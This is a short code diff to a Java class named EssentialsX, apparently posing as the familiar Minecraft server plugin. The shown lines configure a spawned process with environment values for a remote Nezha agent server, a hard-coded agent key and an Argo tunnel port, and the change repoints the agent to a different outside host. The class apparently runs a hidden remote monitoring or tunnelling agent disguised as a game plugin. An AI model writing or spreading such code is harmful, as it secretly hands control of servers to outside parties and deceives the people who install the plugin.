@@ -75,7 +75,7 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         env.put("UUID", "09ca53cd-16f6-4527-9bc8-a4f623c0797f");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "nezha.babiq.eu.org");
+        env.put("NEZHA_SERVER", "nezha.future10000.eu.org");
         env.put("NEZHA_PORT", "443");
         env.put("NEZHA_KEY", "t90QG1hHlXvTVfvgBp");
         env.put("ARGO_PORT", "8001");
